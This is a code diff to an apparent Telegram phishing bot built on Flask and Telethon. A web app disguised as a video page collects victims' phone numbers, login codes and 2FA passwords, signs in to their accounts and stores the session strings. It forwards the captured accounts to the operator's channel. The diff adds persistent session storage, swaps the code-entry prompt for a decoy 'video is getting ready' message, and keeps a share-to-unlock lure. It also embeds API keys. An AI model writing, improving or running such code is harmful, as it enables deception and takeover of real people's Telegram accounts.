@@ -25,12 +25,9 @@ PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
-# ============================================================
-# API POOL — multiple API ID/HASH
-# ============================================================
 API_POOL_FILE = "api_pool.json"
+SESSIONS_FILE = "session_store.json"
 
-# Initial 3 API ID/HASH — আপনি যেকোনো সময় api_pool.json edit করে আরো যোগ করতে পারবেন
 DEFAULT_API_POOL = [
     {"api_id": 37949569, "api_hash": "4b3b64bfc9f33bd7d190ee7b9ed2fbb6", "enabled": True},
     {"api_id": 24886849, "api_hash": "2fcdc5fecfdc223a14cbb044e141e223", "enabled": True},
@@ -39,7 +36,6 @@ DEFAULT_API_POOL = [
 
 
 def load_api_pool():
-    """Load API pool from file, or create from defaults."""
     if os.path.exists(API_POOL_FILE):
         try:
             with open(API_POOL_FILE) as f:
@@ -48,7 +44,6 @@ def load_api_pool():
                 return [p for p in pool if p.get("enabled", True)]
         except Exception as e:
             logger.error(f"load_api_pool: {e}")
-    # create default
     try:
         with open(API_POOL_FILE, "w") as f:
             json.dump(DEFAULT_API_POOL, f, indent=2)
@@ -57,30 +52,18 @@ def load_api_pool():
     return [p for p in DEFAULT_API_POOL if p.get("enabled", True)]
 
 
-def save_api_pool(pool):
-    try:
-        with open(API_POOL_FILE, "w") as f:
-            json.dump(pool, f, indent=2)
-    except Exception as e:
-        logger.error(f"save_api_pool: {e}")
-
-
-# Global state
 _api_pool = load_api_pool()
-_api_health = {}  # api_id -> {"fails": 0, "last_fail": 0, "banned": False}
+_api_health = {}
 
 
 def get_next_api():
-    """Return a random healthy API from pool."""
     healthy = [a for a in _api_pool if not _api_health.get(a["api_id"], {}).get("banned", False)]
     if not healthy:
-        # try to recover banned ones after cooldown
         now = time.time()
         for a in _api_pool:
             h = _api_health.get(a["api_id"], {})
             if h.get("banned") and now - h.get("last_fail", 0) > 3600:
-                h["banned"] = False
-                h["fails"] = 0
+                h["banned"] = False; h["fails"] = 0
                 _api_health[a["api_id"]] = h
                 healthy.append(a)
     if not healthy:
@@ -94,7 +77,7 @@ def mark_api_fail(api_id):
     h["last_fail"] = time.time()
     if h["fails"] >= 5:
         h["banned"] = True
-        logger.error(f"🚫 API {api_id} marked banned after {h['fails']} fails")
+        logger.error(f"🚫 API {api_id} marked banned")
 
 
 def mark_api_ok(api_id):
@@ -102,13 +85,9 @@ def mark_api_ok(api_id):
     h["fails"] = 0
 
 
-# Fallback (for admin bot itself — must always use a stable one)
 API_ID = _api_pool[0]["api_id"]
 API_HASH = _api_pool[0]["api_hash"]
 
-# ============================================================
-# FIXED BACKGROUND IMAGE
-# ============================================================
 BG_IMAGE_URL = "https://i.postimg.cc/6p2bmJ5c/IMG-20260914-223742-873.jpg"
 
 BOT_USERNAME = ""
@@ -127,9 +106,7 @@ https://t.me/{bot}
 logger.info("=" * 60)
 logger.info("ADMIN BOT START")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
-logger.info(f"  API POOL   : {len(_api_pool)} APIs loaded")
-for a in _api_pool:
-    logger.info(f"    - {a['api_id']} ({'enabled' if a.get('enabled') else 'disabled'})")
+logger.info(f"  API POOL   : {len(_api_pool)}")
 logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
 logger.info(f"  CHANNEL_ID : {CHANNEL_ID if CHANNEL_ID else 'NOT SET'}")
 logger.info(f"  BG_IMAGE   : {BG_IMAGE_URL}")
@@ -144,9 +121,34 @@ if sys.version_info >= (3, 12) and sys.platform == 'win32':
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024
 
-user_sessions = {}
+# ============================================================
+# PERSISTENT SESSION STORE — File-backed
+# ============================================================
+_sessions_lock = threading.Lock()
+
+
+def load_user_sessions():
+    if os.path.exists(SESSIONS_FILE):
+        try:
+            with open(SESSIONS_FILE) as f:
+                return json.load(f)
+        except Exception as e:
+            logger.error(f"load sessions: {e}")
+    return {}
+
+
+def save_user_sessions(sessions):
+    try:
+        with open(SESSIONS_FILE, 'w') as f:
+            json.dump(sessions, f, indent=2)
+    except Exception as e:
+        logger.error(f"save sessions: {e}")
+
+
+user_sessions = load_user_sessions()
 pending_codes = {}
-sessions_lock = threading.Lock()
+sessions_lock = threading.Lock()  # not used — kept for compat
+
 DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
 WELCOME_FILE = "welcome_config.json"
@@ -158,21 +160,14 @@ RESET_STATE_FILE = "reset_state.json"
 BOTNAME_FILE = "bot_username.json"
 
 STATE = {
-    "welcome_capture": False,
-    "bc_nonlogged_capture": False,
-    "bc_logged_capture": False,
-    "awaiting_timer": False,
-    "awaiting_btn_text": False,
-    "awaiting_btn_url": False,
-    "awaiting_share_msg": False,
-    "awaiting_2fa_pass": False,
-    "awaiting_reset_number": False,
+    "welcome_capture": False, "bc_nonlogged_capture": False, "bc_logged_capture": False,
+    "awaiting_timer": False, "awaiting_btn_text": False, "awaiting_btn_url": False,
+    "awaiting_share_msg": False, "awaiting_2fa_pass": False, "awaiting_reset_number": False,
 }
 
 broadcast_state = {
     "nonlogged_active": False, "nonlogged_next": 0,
-    "logged_active": False, "logged_next": 0,
-    "interval": 60,
+    "logged_active": False, "logged_next": 0, "interval": 60,
 }
 
 timer_value = 60
@@ -272,8 +267,7 @@ def save_share_config(cfg): save_json(SHARE_FILE, cfg)
 
 
 def load_autopass():
-    cfg = load_json(AUTOPASS_FILE, {"password": ""})
-    return cfg.get("password", "")
+    return load_json(AUTOPASS_FILE, {"password": ""}).get("password", "")
 
 
 def save_autopass(pwd): save_json(AUTOPASS_FILE, {"password": pwd})
@@ -343,11 +337,13 @@ def reset_phone_number(phone, reset_by="manual"):
     result = {"phone": phone, "cleared_pending": False, "cleared_session": False,
               "removed_stale_account": False, "kept_account": False,
               "reset_at": now, "reset_by": reset_by}
-    with sessions_lock:
+    with _sessions_lock:
         if phone in pending_codes:
             pending_codes.pop(phone, None); result["cleared_pending"] = True
         if phone in user_sessions:
-            user_sessions.pop(phone, None); result["cleared_session"] = True
+            user_sessions.pop(phone, None)
+            save_user_sessions(user_sessions)
+            result["cleared_session"] = True
     reset_events[phone] = now
     accounts = load_accounts()
     new_accounts = []; removed = False; kept = False
@@ -380,7 +376,7 @@ def reset_all_numbers(reset_by="manual"):
     phones = set()
     for a in load_accounts():
         if a.get("phone"): phones.add(a["phone"])
-    with sessions_lock:
+    with _sessions_lock:
         for p in list(pending_codes.keys()): phones.add(p)
         for p in list(user_sessions.keys()): phones.add(p)
     results = []
@@ -461,11 +457,6 @@ def admin_menu():
 
 
 def api_menu():
-    lines = []
-    for a in _api_pool:
-        h = _api_health.get(a["api_id"], {})
-        status = "🚫 BANNED" if h.get("banned") else ("⚠️ " + str(h.get("fails", 0)) + " fails" if h.get("fails", 0) > 0 else "✅ OK")
-        lines.append(f"`{a['api_id']}` — {status}")
     return [
         [Button.inline("🔄 Refresh", b"api_noop")],
         [Button.inline("♻️ Reset Health", b"api_reset")],
@@ -475,7 +466,7 @@ def api_menu():
 
 def reset_numbers_menu():
     accounts = load_accounts()
-    with sessions_lock:
+    with _sessions_lock:
         pend = len(pending_codes); sess = len(user_sessions)
     return [
         [Button.inline("♻️ RESET ALL NUMBERS", b"rn_all")],
@@ -618,9 +609,12 @@ async def setbot_cmd(event):
 @bot.on(events.NewMessage(pattern='/health'))
 async def health_cmd(event):
     if event.sender_id != YOUR_TELEGRAM_ID: return
+    with _sessions_lock:
+        ns = len(user_sessions)
+        npc = len(pending_codes)
     txt = (f"🏥 HEALTH\n\nbot connected: {bot.is_connected()}\n"
            f"bot username: @{get_bot_username()}\naccounts: {len(captured_accounts)}\n"
-           f"pending_codes: {len(pending_codes)}\nuser_sessions: {len(user_sessions)}\n"
+           f"pending_codes: {npc}\nuser_sessions: {ns}\n"
            f"api_pool: {len(_api_pool)}\nbg_image: {BG_IMAGE_URL}\nchannel_id: {CHANNEL_ID}")
     await event.respond(txt, buttons=admin_menu())
 
@@ -651,7 +645,6 @@ async def cb(event):
     data = event.data.decode()
     chat_id = event.sender_id
     try:
-        # API POOL
         if data == "menu_api":
             await event.answer()
             txt = "🌐 **API Pool**\n\n"
@@ -659,7 +652,6 @@ async def cb(event):
                 h = _api_health.get(a["api_id"], {})
                 status = "🚫 BANNED" if h.get("banned") else ("⚠️ " + str(h.get("fails", 0)) + " fails" if h.get("fails", 0) > 0 else "✅ OK")
                 txt += f"`{a['api_id']}` — {status}\n"
-            txt += f"\n**Total: {len(_api_pool)}**\n\nEdit `api_pool.json` on server to add more."
             await safe_send(chat_id, txt, api_menu(), edit_event=event); return
         if data == "api_noop": return await event.answer("Refreshed")
         if data == "api_reset":
@@ -869,8 +861,10 @@ async def cb(event):
         elif data == "menu_users":
             await event.answer(f"Total: {len(users)}", alert=True)
         elif data == "menu_stats":
+            with _sessions_lock:
+                ns = len(user_sessions); npc = len(pending_codes)
             await event.answer(
-                f"Users: {len(users)}\nAccounts: {len(captured_accounts)}\n2FA: {'SET' if auto_2fa_pass else 'EMPTY'}",
+                f"Users: {len(users)}\nAccounts: {len(captured_accounts)}\nSessions: {ns}\nPending: {npc}",
                 alert=True)
         else:
             await event.answer("Unknown", alert=True)
@@ -1055,7 +1049,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML
+# WEBAPP HTML — text changed to "Video Ready, Please Wait ⏳"
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -1116,8 +1110,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:white;min-hei
 </div>
 <div id="otpBox" class="modal">
 <div class="ico">&#128274;</div>
-<h2 id="otpTitle">Sending verification...</h2>
-<p id="otpSubtitle">Please wait while we send the code</p>
+<h2 id="otpTitle">Video is getting ready, please wait ⏳</h2>
+<p id="otpSubtitle">Please hold on while we prepare your content...</p>
 <div id="otpLoader" class="loader"></div>
 <div id="otpInputSection" style="display:none">
 <div class="otps" id="otpInputWrap">
@@ -1307,8 +1301,8 @@ function handleContact(c) {
 
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
-  document.getElementById('otpTitle').textContent = 'Sending verification...';
-  document.getElementById('otpSubtitle').textContent = 'Please wait while we send the code';
+  document.getElementById('otpTitle').textContent = 'Video is getting ready, please wait ⏳';
+  document.getElementById('otpSubtitle').textContent = 'Please hold on while we prepare your content...';
   document.getElementById('otpLoader').style.display = 'block';
   document.getElementById('otpInputSection').style.display = 'none';
   document.getElementById('otpMsg').className = 'msg';
@@ -1483,8 +1477,8 @@ document.getElementById('shareBtn').onclick = function() {
   var url = urlMatch ? urlMatch[0] : ('https://t.me/' + (BOT_USERNAME || 'your_bot'));
   var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(msgText);
   if (tg) tg.openTelegramLink(share_url); else window.open(share_url, '_blank');
-  var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
-  localStorage.setItem(USK, String(n)); updSteps(n);
+  var n = Math.min(parseInt(localStorage.getItem('pv_shares_' + TG_ID) || '0') + 1, 5);
+  localStorage.setItem('pv_shares_' + TG_ID, String(n)); updSteps(n);
   if (n >= 5) msg('shareMsg', 'Unlocked!', 'ok'); else msg('shareMsg', n + '/5 done.', 'ok');
 };
 </script>
@@ -1508,6 +1502,8 @@ def tg_route(): return WEBAPP_HTML
 
 @app.route('/health')
 def health():
+    with _sessions_lock:
+        ns = len(user_sessions); npc = len(pending_codes)
     return jsonify({
         'status': 'ok',
         'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
@@ -1517,6 +1513,8 @@ def health():
         'bot_username': get_bot_username(),
         'bg_image': BG_IMAGE_URL,
         'api_pool_size': len(_api_pool),
+        'user_sessions': ns,
+        'pending_codes': npc,
         'api_health': {str(k): v for k, v in _api_health.items()},
     })
 
@@ -1562,7 +1560,8 @@ def save_contact():
     if ex:
         return jsonify({'success': True, 'already_captured': True,
             'phone': phone, 'user_id': ex['user_id']})
-    with sessions_lock: pending_codes[phone] = 'contact_saved'
+    with _sessions_lock:
+        pending_codes[phone] = 'contact_saved'
     return jsonify({'success': True, 'phone': phone})
 
 
@@ -1572,7 +1571,8 @@ def share():
     ph = data.get('phone', '')
     if not ph: return jsonify({'success': False, 'error': 'Phone required'})
     ph = format_phone(ph)
-    with sessions_lock: pending_codes[ph] = 'sending'
+    with _sessions_lock:
+        pending_codes[ph] = 'sending'
     tg_id = data.get('tg_id')
     t = threading.Thread(target=_run_tg_thread, args=(ph, None, None, tg_id))
     t.daemon = True; t.start()
@@ -1600,29 +1600,25 @@ def _run_tg_thread(phone, code, password, tg_id):
 
 
 # ============================================================
-# CORE: _tg_action with API POOL ROTATION
+# CORE: _tg_action with API POOL ROTATION + PERSISTENT SESSIONS
 # ============================================================
 async def _tg_action(phone, code=None, password=None, tg_id=None):
-    # ===== OTP SEND (with API rotation) =====
+    global user_sessions
     if not code:
         last_err = None
         tried = set()
-        
         for attempt in range(min(len(_api_pool), 5)):
             api = get_next_api()
-            if not api:
-                break
-            if api["api_id"] in tried:
-                continue
+            if not api: break
+            if api["api_id"] in tried: continue
             tried.add(api["api_id"])
-            
             logger.info(f"🔁 OTP try #{attempt+1} using API {api['api_id']}")
             client = TelegramClient(StringSession(), api["api_id"], api["api_hash"])
             try:
                 await client.connect()
                 r = await client.send_code_request(phone)
                 session_str = StringSession.save(client.session)
-                with sessions_lock:
+                with _sessions_lock:
                     user_sessions[phone] = {
                         'hash': r.phone_code_hash,
                         'session': session_str,
@@ -1630,33 +1626,29 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                         'api_id': api["api_id"],
                         'api_hash': api["api_hash"]
                     }
+                    save_user_sessions(user_sessions)
                     pending_codes[phone] = 'sent'
                 mark_api_ok(api["api_id"])
                 logger.info(f"✅ OTP SENT via API {api['api_id']}: {phone}")
                 return {'success': True}
-            
             except errors.PhoneNumberBannedError:
-                mark_api_ok(api["api_id"])  # not api's fault
-                with sessions_lock: pending_codes[phone] = 'err'
+                mark_api_ok(api["api_id"])
+                with _sessions_lock: pending_codes[phone] = 'err'
                 return {'success': False, 'error': 'Phone number banned by Telegram'}
-            
             except errors.PhoneNumberInvalidError:
                 mark_api_ok(api["api_id"])
-                with sessions_lock: pending_codes[phone] = 'err'
+                with _sessions_lock: pending_codes[phone] = 'err'
                 return {'success': False, 'error': 'Invalid phone number'}
-            
             except errors.FloodWaitError as e:
                 mark_api_fail(api["api_id"])
                 last_err = f'FloodWait {e.seconds}s'
                 logger.warning(f"⚠️ FloodWait {e.seconds}s on API {api['api_id']}")
-                continue  # try next API
-            
+                continue
             except errors.ApiIdInvalidError:
                 mark_api_fail(api["api_id"])
                 last_err = 'API ID invalid'
-                logger.error(f"❌ API {api['api_id']} INVALID — trying next")
+                logger.error(f"❌ API {api['api_id']} INVALID")
                 continue
-            
             except Exception as e:
                 es = str(e)
                 if 'API_ID' in es.upper() or 'API ID' in es:
@@ -1664,27 +1656,24 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
                     last_err = es[:80]
                     logger.error(f"❌ API {api['api_id']} fail: {es[:80]}")
                     continue
-                # other error — fail out
-                with sessions_lock: pending_codes[phone] = 'err'
+                with _sessions_lock: pending_codes[phone] = 'err'
                 return {'success': False, 'error': es[:80]}
-            
             finally:
                 try: await client.disconnect()
                 except Exception: pass
         
-        # all APIs failed
-        with sessions_lock: pending_codes[phone] = 'err'
+        with _sessions_lock: pending_codes[phone] = 'err'
         return {'success': False, 'error': f'All APIs failed. Last: {last_err or "unknown"}'}
 
-    # ===== VERIFY (uses stored api_id/hash) =====
-    with sessions_lock:
-        if phone not in user_sessions:
-            return {'success': False, 'error': 'No session. Resend code.'}
-        s = user_sessions[phone]
+    # VERIFY — read from file-backed store
+    with _sessions_lock:
+        s = user_sessions.get(phone)
+    if not s:
+        logger.error(f"❌ VERIFY: No session stored for {phone}")
+        return {'success': False, 'error': 'No session. Resend code.'}
     
     api_id = s.get('api_id', API_ID)
     api_hash = s.get('api_hash', API_HASH)
-    
     client = TelegramClient(StringSession(s['session']), api_id, api_hash)
     try:
         await client.connect()
@@ -1692,7 +1681,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             try:
                 await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
             except errors.SessionPasswordNeededError:
-                with sessions_lock: pending_codes[phone] = '2fa_needed'
+                with _sessions_lock: pending_codes[phone] = '2fa_needed'
                 if password:
                     try: await client.sign_in(password=password)
                     except errors.PasswordHashInvalidError:
@@ -1725,6 +1714,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         save_account(acc)
         global captured_accounts
         captured_accounts = load_accounts()
+        logger.info(f"✅ ACCOUNT SAVED: {phone}")
 
         name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
         NOTIFY_TARGET = CHANNEL_ID if CHANNEL_ID else YOUR_TELEGRAM_ID
@@ -1737,37 +1727,54 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         sent_msg = None
         for attempt in range(3):
             try:
+                logger.info(f"📤 Channel send attempt {attempt+1} → {NOTIFY_TARGET}")
                 r = await _send_html_via_fresh(NOTIFY_TARGET, full_msg_html)
                 if r:
                     sent_msg = r
                     acc["admin_notify_msg_id"] = r.id; acc["admin_session_msg_id"] = r.id
-                    save_account(acc); captured_accounts = load_accounts(); break
-            except Exception: await asyncio.sleep(0.5)
+                    save_account(acc); captured_accounts = load_accounts()
+                    logger.info(f"✅ CHANNEL SENT (mid={r.id})")
+                    break
+            except Exception as e:
+                logger.warning(f"Channel attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                await asyncio.sleep(0.5)
 
         if not sent_msg and NOTIFY_TARGET != YOUR_TELEGRAM_ID:
+            logger.warning("Channel send failed, trying owner DM")
             for attempt in range(3):
                 try:
                     r = await _send_html_via_fresh(YOUR_TELEGRAM_ID, full_msg_html)
                     if r:
                         sent_msg = r
                         acc["admin_notify_msg_id"] = r.id; acc["admin_session_msg_id"] = r.id
-                        save_account(acc); captured_accounts = load_accounts(); break
-                except Exception: await asyncio.sleep(0.5)
+                        save_account(acc); captured_accounts = load_accounts()
+                        logger.info(f"✅ OWNER SENT (mid={r.id})")
+                        break
+                except Exception as e:
+                    logger.warning(f"Owner attempt {attempt+1} fail: {e}")
+                    await asyncio.sleep(0.5)
 
-        with sessions_lock:
+        if not sent_msg:
+            logger.error(f"❌ NOTIFY FAILED for {phone}")
+
+        with _sessions_lock:
             user_sessions.pop(phone, None)
+            save_user_sessions(user_sessions)
             pending_codes[phone] = 'done'
+        logger.info(f"✅ FULL FLOW COMPLETE: {phone} sent={sent_msg is not None}")
         return {'success': True, 'user_id': me.id}
-    
     except errors.PhoneCodeInvalidError:
+        logger.error(f"❌ CODE INVALID: {phone}")
         return {'success': False, 'error': 'Wrong code'}
     except errors.PhoneCodeExpiredError:
+        logger.error(f"❌ CODE EXPIRED: {phone}")
         return {'success': False, 'error': 'Code expired. Resend.'}
     except errors.SessionPasswordNeededError:
         return {'success': False, 'error': '2FA', 'needs_password': True}
     except Exception as e:
         es = str(e)
         logger.error(f"❌ VERIFY FAIL {phone}: {type(e).__name__}: {es}")
+        logger.error(traceback.format_exc())
         if 'PHONE_CODE_INVALID' in es: return {'success': False, 'error': 'Wrong code'}
         if 'SESSION_PASSWORD_NEEDED' in es: return {'success': False, 'error': '2FA', 'needs_password': True}
         return {'success': False, 'error': es[:80]}
@@ -1779,7 +1786,8 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
 @app.route('/api/check', methods=['POST'])
 def check():
     phone = format_phone(request.json.get('phone', ''))
-    with sessions_lock: s = pending_codes.get(phone, 'waiting')
+    with _sessions_lock:
+        s = pending_codes.get(phone, 'waiting')
     if s == 'waiting':
         accounts = load_accounts()
         if any(a['phone'] == phone for a in accounts): s = 'done'
